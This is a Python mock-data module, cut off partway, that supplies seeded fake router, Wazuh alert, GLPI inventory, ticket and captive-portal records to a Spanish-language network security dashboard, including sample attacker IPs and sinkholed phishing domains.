"""
Mock Data — Repositorio central de datos de prueba.

Todos los datos usan random.Random(seed=42) para reproducibilidad.
Las entidades son coherentes entre servicios:
  192.168.88.10 → lubuntu_desk_1 en MikroTik, agente 004 en Wazuh, PC-Lab-01 en GLPI
  192.168.88.50 → wazuh-server en MikroTik, agente 000 en Wazuh, Server-Wazuh en GLPI
  203.0.113.45  → atacante externo (brute force) en alertas Wazuh

NO importar este módulo a nivel de módulo en los servicios — usar import lazy
dentro de los métodos para evitar circular imports.
"""

from __future__ import annotations

import math
import random as _random_module
from datetime import datetime, timezone, timedelta
from typing import Any

# Seeded RNG for reproducible data
_rng = _random_module.Random(42)

# ── Entidades compartidas (backbone) ──────────────────────────────────────────

_NOW = datetime.now(timezone.utc)

# Hosts del lab (coherentes entre MikroTik ARP, Wazuh, GLPI)
_LAB_HOSTS = [
    {"ip": "192.168.88.1",   "mac": "4C:5E:0C:11:22:33", "name": "MikroTik-GW",    "iface": "bridge"},
    {"ip": "192.168.88.10",  "mac": "52:54:00:AA:BB:01",  "name": "lubuntu_desk_1", "iface": "ether2"},
    {"ip": "192.168.88.11",  "mac": "52:54:00:AA:BB:02",  "name": "lubuntu_desk_2", "iface": "ether2"},
    {"ip": "192.168.88.20",  "mac": "52:54:00:CC:DD:01",  "name": "PC-Aula3-01",   "iface": "ether3"},
    {"ip": "192.168.88.21",  "mac": "52:54:00:CC:DD:02",  "name": "PC-Aula3-02",   "iface": "ether3"},
    {"ip": "192.168.88.50",  "mac": "52:54:00:FF:00:01",  "name": "wazuh-server",   "iface": "ether4"},
    {"ip": "192.168.88.100", "mac": "52:54:00:EE:EE:EE",  "name": "unknown-guest",  "iface": "hotspot"},
    {"ip": "192.168.100.115","mac": "08:00:27:AB:CD:EF",  "name": "wazuh-phy",      "iface": "ether1"},
]

_ATTACKERS = [
    {"ip": "203.0.113.45",  "label": "attacker-brute-force"},
    {"ip": "198.51.100.22", "label": "attacker-port-scan"},
    {"ip": "203.0.113.99",  "label": "attacker-phishing-c2"},
]

def _ts(minutes_ago: int = 0) -> str:
    return (_NOW - timedelta(minutes=minutes_ago)).isoformat()


# ── MockData ──────────────────────────────────────────────────────────────────

class MockData:
    """Repositorio central de datos de prueba. Todo en un solo lugar."""

    # ── MikroTik ──────────────────────────────────────────────────────────────

    class mikrotik:

        @staticmethod
        def interfaces() -> list[dict]:
            return [
                {"id": "*1",  "name": "ether1",   "type": "ether", "mac_address": "4C:5E:0C:00:00:01",
                 "running": True,  "disabled": False, "rx_byte": 8_543_210_000, "tx_byte": 2_100_000_000,
                 "rx_error": 0, "tx_error": 0, "mtu": 1500, "comment": "WAN uplink"},
                {"id": "*2",  "name": "ether2",   "type": "ether", "mac_address": "4C:5E:0C:00:00:02",
                 "running": True,  "disabled": False, "rx_byte": 3_200_000_000, "tx_byte": 1_800_000_000,
                 "rx_error": 0, "tx_error": 0, "mtu": 1500, "comment": "LAN – Lab Redes"},
                {"id": "*3",  "name": "ether3",   "type": "ether", "mac_address": "4C:5E:0C:00:00:03",
                 "running": True,  "disabled": False, "rx_byte": 1_400_000_000, "tx_byte": 900_000_000,
                 "rx_error": 3, "tx_error": 1, "mtu": 1500, "comment": "LAN – Aula 3"},
                {"id": "*4",  "name": "ether4",   "type": "ether", "mac_address": "4C:5E:0C:00:00:04",
                 "running": True,  "disabled": False, "rx_byte": 500_000_000,  "tx_byte": 200_000_000,
                 "rx_error": 0, "tx_error": 0, "mtu": 1500, "comment": "LAN – Servidores"},
                {"id": "*5",  "name": "bridge",   "type": "bridge","mac_address": "4C:5E:0C:00:00:05",
                 "running": True,  "disabled": False, "rx_byte": 0, "tx_byte": 0,
                 "rx_error": 0, "tx_error": 0, "mtu": 1500, "comment": ""},
                {"id": "*6",  "name": "vlan10",   "type": "vlan",  "mac_address": "4C:5E:0C:00:00:06",
                 "running": True,  "disabled": False, "rx_byte": 750_000_000,  "tx_byte": 300_000_000,
                 "rx_error": 0, "tx_error": 0, "mtu": 1500, "comment": "VLAN Docentes"},
                {"id": "*7",  "name": "vlan20",   "type": "vlan",  "mac_address": "4C:5E:0C:00:00:07",
                 "running": True,  "disabled": False, "rx_byte": 200_000_000,  "tx_byte": 80_000_000,
                 "rx_error": 0, "tx_error": 0, "mtu": 1500, "comment": "VLAN Estudiantes"},
                {"id": "*8",  "name": "hotspot1", "type": "ether", "mac_address": "4C:5E:0C:00:00:08",
                 "running": True,  "disabled": False, "rx_byte": 120_000_000,  "tx_byte": 60_000_000,
                 "rx_error": 0, "tx_error": 0, "mtu": 1500, "comment": "Hotspot"},
            ]

        @staticmethod
        def arp_table() -> list[dict]:
            result = []
            for h in _LAB_HOSTS:
                result.append({
                    "ip_address": h["ip"],
                    "mac_address": h["mac"],
                    "interface": h["iface"],
                    "comment": h["name"],
                    "dynamic": True,
                    "complete": True,
                    "invalid": False,
                    "published": False,
                    "dhcp": True,
                })
            return result

        @staticmethod
        def connections() -> list[dict]:
            conns = []
            protocols = ["tcp", "tcp", "tcp", "udp"]
            states = ["established", "established", "time-wait", ""]
            pairs = [
                ("192.168.88.10", "203.0.113.45", 443, 54321),
                ("192.168.88.11", "8.8.8.8",      53,  49152),
                ("192.168.88.20", "192.168.88.50", 1514, 55000),
                ("192.168.88.21", "192.168.88.50", 1514, 55001),
                ("192.168.88.50", "192.168.100.115", 9200, 60001),
                ("192.168.88.10", "198.51.100.22",443, 50001),
            ]
            for i, (src, dst, dport, sport) in enumerate(pairs):
                conns.append({
                    "id": f"conn-{i}",
                    "protocol": protocols[i % len(protocols)],
                    "state": states[i % len(states)],
                    "src_address": f"{src}:{sport}",
                    "dst_address": f"{dst}:{dport}",
                    "reply_src_address": f"{dst}:{dport}",
                    "reply_dst_address": f"{src}:{sport}",
                    "bytes": _rng.randint(1000, 500_000),
                    "packets": _rng.randint(10, 5000),
                })
            return conns

        @staticmethod
        def firewall_rules() -> list[dict]:
            return [
                {"id": "*1",  "chain": "forward", "action": "drop", "comment": "[NetShield] Auto-block 203.0.113.45",
                 "src_address": "203.0.113.45", "dst_address": "", "protocol": "", "disabled": False, "invalid": False, "bytes": 1024, "packets": 8},
                {"id": "*2",  "chain": "forward", "action": "drop", "comment": "[NetShield] Blacklist_Automatica — brute-force",
                 "src_address": "198.51.100.22", "dst_address": "", "protocol": "", "disabled": False, "invalid": False, "bytes": 512, "packets": 4},
                {"id": "*3",  "chain": "forward", "action": "accept","comment": "Allow established",
                 "src_address": "", "dst_address": "", "protocol": "", "disabled": False, "invalid": False, "bytes": 50_000_000, "packets": 400_000},
                {"id": "*4",  "chain": "input",   "action": "drop",  "comment": "Drop invalid",
                 "src_address": "", "dst_address": "", "protocol": "", "disabled": False, "invalid": False, "bytes": 200, "packets": 3},
                {"id": "*5",  "chain": "forward", "action": "drop",  "comment": "[NetShield] Sinkhole: evil-phishing.com",
                 "src_address": "", "dst_address": "203.0.113.99",   "protocol": "tcp", "disabled": False, "invalid": False, "bytes": 0, "packets": 0},
            ]

        @staticmethod
        def address_lists() -> list[dict]:
            return [
                {"id": "*1", "list": "Blacklist_Automatica", "address": "203.0.113.45",  "comment": "[NetShield] brute-force",    "timeout": "23:45:12", "disabled": False, "dynamic": False},
                {"id": "*2", "list": "Blacklist_Automatica", "address": "198.51.100.22", "comment": "[NetShield] port-scan",      "timeout": "12:00:00", "disabled": False, "dynamic": False},
                {"id": "*3", "list": "Geoblock",             "address": "185.220.0.0/16","comment": "Tor exit node range",         "timeout": "",        "disabled": False, "dynamic": False},
                {"id": "*4", "list": "Sinkhole",             "address": "203.0.113.99",  "comment": "evil-phishing.com",          "timeout": "",        "disabled": False, "dynamic": False},
            ]

        @staticmethod
        def vlans() -> list[dict]:
            return [
                {"id": "*A",  "vlan_id": 10, "name": "vlan10", "interface": "bridge", "comment": "VLAN Docentes",     "disabled": False, "running": True},
                {"id": "*B",  "vlan_id": 20, "name": "vlan20", "interface": "bridge", "comment": "VLAN Estudiantes",  "disabled": False, "running": True},
                {"id": "*C",  "vlan_id": 30, "name": "vlan30", "interface": "bridge", "comment": "VLAN Servidores",   "disabled": False, "running": True},
                {"id": "*D",  "vlan_id": 99, "name": "vlan99", "interface": "bridge", "comment": "VLAN Cuarentena",   "disabled": False, "running": False},
            ]

        @staticmethod
        def vlan_traffic() -> list[dict]:
            return [
                {"vlan_id": 10, "name": "vlan10", "rx_bps": 4_200_000, "tx_bps": 1_800_000, "status": "ok"},
                {"vlan_id": 20, "name": "vlan20", "rx_bps": 1_100_000, "tx_bps": 500_000,   "status": "ok"},
                {"vlan_id": 30, "name": "vlan30", "rx_bps": 850_000,   "tx_bps": 200_000,   "status": "ok"},
                {"vlan_id": 99, "name": "vlan99", "rx_bps": 0,         "tx_bps": 0,          "status": "inactive"},
            ]

        @staticmethod
        def vlan_addresses() -> list[dict]:
            return [
                {"interface": "vlan10", "address": "10.10.10.1/24",  "network": "10.10.10.0", "comment": "GW Docentes",    "disabled": False},
                {"interface": "vlan20", "address": "10.10.20.1/24",  "network": "10.10.20.0", "comment": "GW Estudiantes", "disabled": False},
                {"interface": "vlan30", "address": "10.10.30.1/24",  "network": "10.10.30.0", "comment": "GW Servidores",  "disabled": False},
                {"interface": "vlan99", "address": "10.99.99.1/24",  "network": "10.99.99.0", "comment": "GW Cuarentena",  "disabled": False},
            ]

        @staticmethod
        def traffic() -> list[dict]:
            """Base traffic snapshot per interface (no variation — use websocket for dynamic)."""
            ifaces = ["ether1", "ether2", "ether3", "ether4", "vlan10", "vlan20"]
            rx_base = [5_200_000, 3_100_000, 1_400_000, 800_000, 4_200_000, 1_100_000]
            tx_base = [2_100_000, 1_800_000, 900_000,   200_000, 1_800_000, 500_000]
            return [
                {"interface": iface, "rx_bps": rx, "tx_bps": tx, "status": "ok"}
                for iface, rx, tx in zip(ifaces, rx_base, tx_base)
            ]

        @staticmethod
        def logs(limit: int = 20) -> list[dict]:
            entries = [
                ("firewall",  "input",   f"input: in:ether1 out:ether2 src-mac {_LAB_HOSTS[1]['mac']} proto TCP {_LAB_HOSTS[1]['ip']}:54321->{_ATTACKERS[0]['ip']}:443", 5),
                ("firewall",  "forward", f"forward: in:ether2 src {_LAB_HOSTS[1]['ip']} dst {_ATTACKERS[1]['ip']}, chain=forward action=drop",  12),
                ("dhcp",      "info",    f"assigned 192.168.88.20 to {_LAB_HOSTS[3]['mac']}",  20),
                ("dhcp",      "info",    f"assigned 192.168.88.21 to {_LAB_HOSTS[4]['mac']}",  25),
                ("system",    "info",    "router rebooted",  180),
                ("firewall",  "input",   f"input: dropped brute-force from {_ATTACKERS[0]['ip']}",  8),
                ("hotspot",   "info",    "PC-Aula3-01 logged in (user: alumno01)",  15),
                ("hotspot",   "info",    "PC-Aula3-02 logged in (user: alumno02)",  18),
                ("interface", "warning", "ether3: rx-error count increased to 3",  30),
                ("firewall",  "input",   f"port-scan detected from {_ATTACKERS[1]['ip']}",  45),
            ]
            result = []
            for i, (topics, severity, msg, mins_ago) in enumerate(entries[:limit]):
                result.append({
                    "id": str(i + 1),
                    "time": _ts(mins_ago),
                    "topics": topics,
                    "severity": severity,
                    "message": msg,
                })
            return result

        @staticmethod
        def system_health() -> dict:
            return {
                "version": "7.14.2 (stable)",
                "uptime": "15d 4h 22m 13s",
                "cpu_load": 12,
                "free_memory": 512 * 1024 * 1024,
                "total_memory": 1024 * 1024 * 1024,
                "free_disk": 2048 * 1024 * 1024,
                "board_name": "CHR",
                "architecture_name": "x86_64",
                "platform": "MikroTik",
                "bad_blocks": "0%",
            }

        @staticmethod
        def dns_static() -> list[dict]:
            return [
                {"name": "evil-phishing.com", "address": "127.0.0.1", "type": "A",
                 "ttl": "1d", "comment": "[NetShield] Sinkhole", "disabled": False},
                {"name": "malware-c2.net",    "address": "127.0.0.1", "type": "A",
                 "ttl": "1d", "comment": "[NetShield] Sinkhole", "disabled": False},
            ]

    # ── Wazuh ─────────────────────────────────────────────────────────────────

    class wazuh:

        @staticmethod
        def agents() -> list[dict]:
            return [
                {
                    "id": "000", "name": "wazuh-manager", "ip": "192.168.88.50",
                    "status": "active", "os_name": "Ubuntu", "os_version": "22.04",
                    "manager": "wazuh-manager", "node_name": "node01",
                    "group": ["default"], "last_keep_alive": _ts(1),
                    "date_add": _ts(30 * 24 * 60),
                },
                {
                    "id": "001", "name": "wazuh-phy", "ip": "192.168.100.115",
                    "status": "active", "os_name": "Ubuntu", "os_version": "22.04",
                    "manager": "wazuh-manager", "node_name": "node01",
                    "group": ["servers"], "last_keep_alive": _ts(2),
                    "date_add": _ts(20 * 24 * 60),
                },
                {
                    "id": "004", "name": "lubuntu_desk_1", "ip": "192.168.88.10",
                    "status": "active", "os_name": "Lubuntu", "os_version": "22.04",
                    "manager": "wazuh-manager", "node_name": "node01",
                    "group": ["workstations"], "last_keep_alive": _ts(3),
                    "date_add": _ts(10 * 24 * 60),
                },
                {
                    "id": "005", "name": "lubuntu_desk_2", "ip": "192.168.88.11",
                    "status": "active", "os_name": "Lubuntu", "os_version": "22.04",
                    "manager": "wazuh-manager", "node_name": "node01",
                    "group": ["workstations"], "last_keep_alive": _ts(4),
                    "date_add": _ts(8 * 24 * 60),
                },
                {
                    "id": "006", "name": "PC-Aula3-01", "ip": "192.168.88.20",
                    "status": "disconnected", "os_name": "Windows", "os_version": "10",
                    "manager": "wazuh-manager", "node_name": "node01",
                    "group": ["workstations"], "last_keep_alive": _ts(180),
                    "date_add": _ts(5 * 24 * 60),
                },
            ]

        @staticmethod
        def agents_summary() -> dict:
            return {
                "active": 4, "disconnected": 1, "never_connected": 0,
                "pending": 0, "total": 5,
            }

        @staticmethod
        def alerts(
            limit: int = 50,
            level_min: int | None = None,
            agent_id: str | None = None,
        ) -> list[dict]:
            """Generate coherent alerts using seeded RNG."""
            _r = _random_module.Random(42)
            agent_pool = MockData.wazuh.agents()
            if agent_id:
                agent_pool = [a for a in agent_pool if a["id"] == agent_id] or agent_pool[:1]

            _alert_templates = [
                (12, "Authentication failure", "T1110", "Brute Force", "192.168.88.10", _ATTACKERS[0]["ip"]),
                (14, "Multiple authentication failures", "T1110", "Brute Force", "192.168.88.11", _ATTACKERS[0]["ip"]),
                (7,  "Port scan detected", "T1046", "Network Service Discovery", "192.168.88.50", _ATTACKERS[1]["ip"]),
                (10, "Rootkit detection: hidden file", "T1014", "Rootkit", "192.168.88.10", ""),
                (5,  "System audit: command", "T1059", "Command and Scripting Interpreter", "192.168.88.11", ""),
                (8,  "Phishing site access detected", "T1566", "Phishing", "192.168.88.20", _ATTACKERS[2]["ip"]),
                (6,  "Unexpected outbound connection", "T1071", "Application Layer Protocol", "192.168.88.21", _ATTACKERS[0]["ip"]),
                (9,  "Privilege escalation attempt via sudo", "T1548", "Abuse Elevation Control Mechanism", "192.168.88.10", ""),
                (3,  "Log rotation executed", "", "", "192.168.88.50", ""),
                (4,  "Successful SSH login", "", "", "192.168.88.11", ""),
                # IPs dentro de subredes VLAN — activan correlación VLAN→alert en modo mock
                (11, "Brute force desde VLAN Docentes", "T1110", "Brute Force", "192.168.88.10", "10.10.10.15"),
                (8,  "Port scan desde VLAN Servidores", "T1046", "Network Service Discovery", "192.168.88.50", "10.10.30.5"),
            ]

            result = []
            for i in range(min(limit * 2, 200)):
                if len(result) >= limit:
                    break
                tmpl = _alert_templates[i % len(_alert_templates)]
                level, desc, mitre_id, mitre_name, agent_ip, src_ip = tmpl
                if level_min and level < level_min:
                    continue
                agent = next((a for a in agent_pool if a["ip"] == agent_ip), _r.choice(agent_pool))
                alert: dict[str, Any] = {
                    "id": f"mock-{i:05d}",
                    "timestamp": _ts(_r.randint(1, 120)),
                    "agent_id": agent["id"],
                    "agent_name": agent["name"],
                    "agent_ip": agent["ip"],
                    "rule_id": f"1{_r.randint(1000, 9999)}",
                    "rule_level": level,
                    "rule_description": desc,
                    "rule_groups": [mitre_name.lower().replace(" ", "_")] if mitre_name else ["syslog"],
                    "full_log": f"[mock] {desc} from {src_ip or agent_ip}",
                    "src_ip": src_ip,
                    "dst_ip": "",
                    "location": f"/var/log/auth.log" if "auth" in desc.lower() else f"/var/ossec/logs/active-responses.log",
                    "mitre_technique": mitre_name,
                    "mitre_id": mitre_id,
                    "dst_url": "http://evil-phishing.com/login" if "phishing" in desc.lower() else "",
                    "user": "root" if "privilege" in desc.lower() else "",
                }
                result.append(alert)
            return result

        @staticmethod
        def critical_alerts(limit: int = 50) -> list[dict]:
            return [a for a in MockData.wazuh.alerts(limit=100, level_min=10)][:limit]

        @staticmethod
        def alerts_timeline(level_min: int = 5, minutes: int = 60) -> list[dict]:
            """Return per-minute bucketed alert counts for the past N minutes."""
            _r = _random_module.Random(42)
            result = []
            for i in range(minutes):
                t = _NOW - timedelta(minutes=minutes - i)
                # Spike at minutes 15 and 45
                base = 2 if (i % 15 == 0) else _r.randint(0, 2)
                spike = 8 if (i in (15, 45)) else 0
                result.append({"minute": t.strftime("%Y-%m-%dT%H:%M:00"), "count": base + spike})
            return result

        @staticmethod
        def top_agents(limit: int = 10) -> list[dict]:
            agents = MockData.wazuh.agents()
            counts = [45, 12, 23, 18, 2]
            techniques = ["Brute Force", "Application Layer Protocol", "Brute Force", "Phishing", ""]
            return [
                {
                    "agent_id": a["id"],
                    "agent_name": a["name"],
                    "alert_count": counts[i],
                    "last_alert_timestamp": _ts(i * 5 + 1),
                    "top_mitre_technique": techniques[i],
                }
                for i, a in enumerate(agents[:limit])
                if counts[i] > 0
            ]

        @staticmethod
        def mitre_summary() -> list[dict]:
            techniques = [
                ("T1110", "Brute Force",                        45, 2),
                ("T1566", "Phishing",                           12, 8),
                ("T1046", "Network Service Discovery",          8,  15),
                ("T1014", "Rootkit",                            3,  30),
                ("T1548", "Abuse Elevation Control Mechanism",  2,  60),
                ("T1059", "Command and Scripting Interpreter",  7,  20),
                ("T1071", "Application Layer Protocol",         5,  10),
            ]
            return [
                {
                    "technique_id": tid, "technique_name": name,
                    "count": count, "last_seen": _ts(last_mins),
                }
                for tid, name, count, last_mins in techniques
            ]

        @staticmethod
        def health() -> dict:
            return {
                "services": [
                    {"service_name": "wazuh-analysisd", "status": "running"},
                    {"service_name": "wazuh-remoted",   "status": "running"},
                    {"service_name": "wazuh-syscheckd", "status": "running"},
                    {"service_name": "wazuh-monitord",  "status": "running"},
                    {"service_name": "wazuh-db",        "status": "running"},
                    {"service_name": "wazuh-apid",      "status": "running"},
                    {"service_name": "filebeat",        "status": "running"},
                ],
                "version": "4.7.1",
                "cluster_enabled": False,
            }

        @staticmethod
        def phishing_alerts() -> list[dict]:
            base = MockData.wazuh.alerts(limit=50)
            return [a for a in base if "phishing" in a["rule_description"].lower() or a["dst_url"]]

    # ── GLPI ─────────────────────────────────────────────────────────────────

    class glpi:

        @staticmethod
        def computers(limit: int = 20) -> list[dict]:
            computers = [
                {"id": 1,  "name": "PC-Lab-01",     "ip": "192.168.88.10",  "mac": "52:54:00:AA:BB:01",
                 "os": "Lubuntu 22.04",   "cpu": "AMD Ryzen 5 3600",   "ram": "16",
                 "location": "Lab Redes", "location_id": 3, "status": "activo",
                 "serial": "SN100001", "assigned_user": "juan.perez", "comment": "", "last_update": _ts(60), "tickets": []},
                {"id": 2,  "name": "PC-Lab-02",     "ip": "192.168.88.11",  "mac": "52:54:00:AA:BB:02",
                 "os": "Lubuntu 22.04",   "cpu": "AMD Ryzen 5 3600",   "ram": "16",
                 "location": "Lab Redes", "location_id": 3, "status": "activo",
                 "serial": "SN100002", "assigned_user": "maria.garcia", "comment": "", "last_update": _ts(120), "tickets": []},
                {"id": 3,  "name": "PC-Aula3-01",   "ip": "192.168.88.20",  "mac": "52:54:00:CC:DD:01",
                 "os": "Windows 10",      "cpu": "Intel Core i5-10400",  "ram": "8",
                 "location": "Aula 101",  "location_id": 1, "status": "activo",
                 "serial": "SN100003", "assigned_user": "", "comment": "Wazuh agent disconnected", "last_update": _ts(200), "tickets": []},
                {"id": 4,  "name": "PC-Aula3-02",   "ip": "192.168.88.21",  "mac": "52:54:00:CC:DD:02",
                 "os": "Windows 10",      "cpu": "Intel Core i5-10400",  "ram": "8",
                 "location": "Aula 101",  "location_id": 1, "status": "activo",
                 "serial": "SN100004", "assigned_user": "", "comment": "", "last_update": _ts(180), "tickets": []},
                {"id": 5,  "name": "Server-Wazuh",  "ip": "192.168.88.50",  "mac": "52:54:00:FF:00:01",
                 "os": "Ubuntu 22.04",    "cpu": "Intel Core i7-10700",  "ram": "32",
                 "location": "Sala Servidores", "location_id": 5, "status": "activo",
                 "serial": "SN100005", "assigned_user": "admin", "comment": "[NetShield] Wazuh SIEM server", "last_update": _ts(30), "tickets": []},
                {"id": 6,  "name": "PC-Aula2-01",   "ip": "192.168.88.30",  "mac": "52:54:00:DD:01:01",
                 "os": "Windows 11",      "cpu": "Intel Core i5-12600",  "ram": "16",
                 "location": "Aula 102",  "location_id": 2, "status": "reparacion",
                 "serial": "SN100006", "assigned_user": "", "comment": "Disco duro con sectores dañados", "last_update": _ts(500), "tickets": []},
                {"id": 7,  "name": "PC-Lab-Sis-01", "ip": "192.168.88.40",  "mac": "52:54:00:EE:01:01",
                 "os": "Debian 12",       "cpu": "AMD Ryzen 7 5700",     "ram": "32",
                 "location": "Lab Sistemas", "location_id": 4, "status": "activo",
                 "serial": "SN100007", "assigned_user": "tecnico1", "comment": "", "last_update": _ts(90), "tickets": []},
                {"id": 8,  "name": "PC-Retirado-01","ip": "",               "mac": "",
                 "os": "Windows 7",       "cpu": "Intel Core i3-3220",   "ram": "4",
                 "location": "Aula 101",  "location_id": 1, "status": "retirado",
                 "serial": "SN099001", "assigned_user": "", "comment": "EOL — hardware obsoleto", "last_update": _ts(8640), "tickets": []},
            ]
            return computers[:limit]

        @staticmethod
        def stats() -> dict:
            return {"activo": 5, "reparacion": 1, "retirado": 1, "pendiente": 0, "total": 7}

        @staticmethod
        def tickets(limit: int = 10) -> list[dict]:
            tickets = [
                {"id": 1,  "title": "[NetShield] Alerta crítica — multiple auth failures en PC-Lab-01",
                 "description": "Se detectaron múltiples intentos de autenticación fallida desde 203.0.113.45.",
                 "priority": 5, "priority_label": "Muy Alta", "status": "en_progreso", "status_id": 3,
                 "assigned_user": "tecnico1", "asset_name": "PC-Lab-01", "asset_id": 1,
                 "category": "seguridad", "created_at": _ts(45), "due_date": "", "is_netshield": True},
                {"id": 2,  "title": "Falla de disco — PC-Aula2-01",
                 "description": "Error de E/S en /dev/sda. Requiere reemplazo de disco.",
                 "priority": 4, "priority_label": "Alta", "status": "pendiente", "status_id": 1,
                 "assigned_user": "", "asset_name": "PC-Aula2-01", "asset_id": 6,
                 "category": "hardware", "created_at": _ts(200), "due_date": "", "is_netshield": False},
                {"id": 3,  "title": "Actualización pendiente — PC-Aula3-01",
                 "description": "Windows 10 sin actualizaciones hace 60 días. Wazuh reporta vulnerabilidades.",
                 "priority": 3, "priority_label": "Media", "status": "pendiente", "status_id": 1,
                 "assigned_user": "tecnico1", "asset_name": "PC-Aula3-01", "asset_id": 3,
                 "category": "so", "created_at": _ts(300), "due_date": "", "is_netshield": False},
                {"id": 4,  "title": "[NetShield] Cuarentena automática — PC-Lab-01",
                 "description": "Cuarentena iniciada automáticamente por NetShield Dashboard.\nMotivo: brute-force desde 203.0.113.45",
                 "priority": 5, "priority_label": "Muy Alta", "status": "resuelto", "status_id": 5,
                 "assigned_user": "tecnico1", "asset_name": "PC-Lab-01", "asset_id": 1,
                 "category": "seguridad", "created_at": _ts(480), "due_date": "", "is_netshield": True},
                {"id": 5,  "title": "Error de red — ether3 con errores de RX",
                 "description": "Interface ether3 reporta 3 errores de RX. Requiere revisión de cable.",
                 "priority": 3, "priority_label": "Media", "status": "pendiente", "status_id": 1,
                 "assigned_user": "", "asset_name": "", "asset_id": None,
                 "category": "red", "created_at": _ts(30), "due_date": "", "is_netshield": False},
            ]
            return tickets[:limit]

        @staticmethod
        def users() -> list[dict]:
            return [
                {"id": 1, "name": "juan.perez",    "realname": "Pérez",    "firstname": "Juan",
                 "email": "juan.perez@facultad.edu",    "department": "Docentes",       "display_name": "Juan Pérez"},
                {"id": 2, "name": "maria.garcia",  "realname": "García",   "firstname": "María",
                 "email": "maria.garcia@facultad.edu",  "department": "Administrativos","display_name": "María García"},
                {"id": 3, "name": "tecnico1",      "realname": "López",    "firstname": "Carlos",
                 "email": "tecnico1@facultad.edu",      "department": "IT",             "display_name": "Carlos López"},
                {"id": 4, "name": "admin",         "realname": "Admin",    "firstname": "Sistema",
                 "email": "admin@facultad.edu",         "department": "IT",             "display_name": "Sistema Admin"},
                {"id": 5, "name": "ana.martinez",  "realname": "Martínez", "firstname": "Ana",
                 "email": "ana.martinez@facultad.edu",  "department": "Docentes",       "display_name": "Ana Martínez"},
            ]

        @staticmethod
        def locations() -> list[dict]:
            return [
                {"id": 1, "name": "Aula 101",       "completename": "Edificio A > Aula 101",       "comment": "",                     "building": "A", "room": "101"},
                {"id": 2, "name": "Aula 102",       "completename": "Edificio A > Aula 102",       "comment": "",                     "building": "A", "room": "102"},
                {"id": 3, "name": "Lab Redes",      "completename": "Edificio B > Lab Redes",      "comment": "Laboratorio de redes", "building": "B", "room": "201"},
                {"id": 4, "name": "Lab Sistemas",   "completename": "Edificio B > Lab Sistemas",   "comment": "",                     "building": "B", "room": "202"},
                {"id": 5, "name": "Sala Servidores","completename": "Edificio C > Sala Servidores","comment": "Rack principal",       "building": "C", "room": "001"},
            ]

    # ── Anthropic ─────────────────────────────────────────────────────────────

    class anthropic:

        @staticmethod
        def report_html() -> dict:
            html = """
<h1>Informe de Seguridad — NetShield Dashboard</h1>
<p><em>Período: últimas 24 horas | Audiencia: Técnico</em></p>

<h2>Resumen Ejecutivo</h2>
<p>Durante el período analizado se detectaron <strong>45 alertas de seguridad</strong>,
de las cuales <strong>14 son críticas</strong> (nivel ≥ 10). La amenaza principal identificada
es un ataque de fuerza bruta sostenido desde <code>203.0.113.45</code> contra
<code>PC-Lab-01 (192.168.88.10)</code>.</p>

<h2>Alertas por Severidad</h2>
<ul>
  <li><strong>Críticas (≥10):</strong> 14 alertas</li>
  <li><strong>Altas (7-9):</strong> 18 alertas</li>
  <li><strong>Medias (4-6):</strong> 13 alertas</li>
</ul>

<h2>Técnicas MITRE ATT&amp;CK Detectadas</h2>
<table>
  <thead><tr><th>Técnica</th><th>ID</th><th>Ocurrencias</th></tr></thead>
  <tbody>
    <tr><td>Brute Force</td><td>T1110</td><td>45</td></tr>
    <tr><td>Phishing</td><td>T1566</td><td>12</td></tr>
    <tr><td>Network Service Discovery</td><td>T1046</td><td>8</td></tr>
  </tbody>
</table>

<h2>Acciones Recomendadas</h2>
<ol>
  <li>Mantener bloqueo de <code>203.0.113.45</code> en Blacklist_Automatica.</li>
  <li>Revisar logs de autenticación en <code>PC-Lab-01</code> y <code>PC-Lab-02</code>.</li>
  <li>Actualizar sistema operativo en <code>PC-Aula3-01</code> (Windows 10 sin parches).</li>
  <li>Revisar cable de interface <code>ether3</code> (errores de RX detectados).</li>
</ol>
"""
            return {
                "title": "Informe de Seguridad — últimas 24h",
                "html": html.strip(),
                "audience": "tecnico",
                "tokens_used": 1247,
                "mock": True,
            }

    # ── AI (Anthropic) ────────────────────────────────────────────────────────

    class ai:

        @staticmethod
        def mock_report(prompt: str = "", audience: str = "technical") -> dict:
            """Return a pre-built mock HTML report without calling Anthropic API."""
            base = MockData.anthropic.report_html()
            return {
                "html_content": base["html"],
                "title": base["title"],
                "summary": prompt[:200] if prompt else "Informe de seguridad de demostración generado en modo mock.",
                "data_sources_used": ["get_wazuh_alerts", "get_mikrotik_connections"],
                "tokens_used": base["tokens_used"],
                "mock": True,
            }

    # ── Portal Cautivo ────────────────────────────────────────────────────────

    class portal:

        @staticmethod
        def profiles() -> list[dict]:
            return [
                {"name": "default",        "rate_limit": "10M/10M",    "session_timeout": "8h",  "idle_timeout": "30m", "shared_users": 1},
                {"name": "docentes",       "rate_limit": "50M/50M",    "session_timeout": "12h", "idle_timeout": "1h",  "shared_users": 1},
                {"name": "estudiantes",    "rate_limit": "5M/5M",      "session_timeout": "4h",  "idle_timeout": "15m", "shared_users": 1},
                {"name": "unregistered",   "rate_limit": "1M/1M",      "session_timeout": "1h",  "idle_timeout": "10m", "shared_users": 0},
                {"name": "administracion", "rate_limit": "100M/100M",  "session_timeout": "24h", "idle_timeout": "2h",  "shared_users": 1},
            ]

        @staticmethod
        def users() -> list[dict]:
            return [
                {"name": "juan.perez",  "profile": "docentes",    "password": "***", "comment": "Docente Lab Redes", "uptime_limit": "", "bytes_in": 1_234_567, "bytes_out": 456_789, "disabled": False},
                {"name": "maria.garcia","profile": "docentes",    "password": "***", "comment": "Docente Sistemas",  "uptime_limit": "", "bytes_in": 876_543,   "bytes_out": 234_567, "disabled": False},
                {"name": "alumno01",    "profile": "estudiantes", "password": "***", "comment": "Aula 3",           "uptime_limit": "4h", "bytes_in": 234_567, "bytes_out": 56_789,  "disabled": False},
                {"name": "alumno02",    "profile": "estudiantes", "password": "***", "comment": "Aula 3",           "uptime_limit": "4h", "bytes_in": 198_765, "bytes_out": 43_210,  "disabled": False},
                {"name": "admin",       "profile": "administracion","password":"***", "comment": "Administrador",   "uptime_limit": "", "bytes_in": 5_678_901,  "bytes_out": 2_345_678, "disabled": False},
            ]

        @staticmethod
        def active_sessions() -> list[dict]:
            return [
                {"id": "sess-001", "user": "alumno01",   "address": "192.168.88.20", "mac": "52:54:00:CC:DD:01",
                 "uptime": "1h 23m", "idle": "0s", "bytes_in": 234_567, "bytes_out": 56_789, "session_time_left": "2h 37m", "status": "registered"},
                {"id": "sess-002", "user": "alumno02",   "address": "192.168.88.21", "mac": "52:54:00:CC:DD:02",
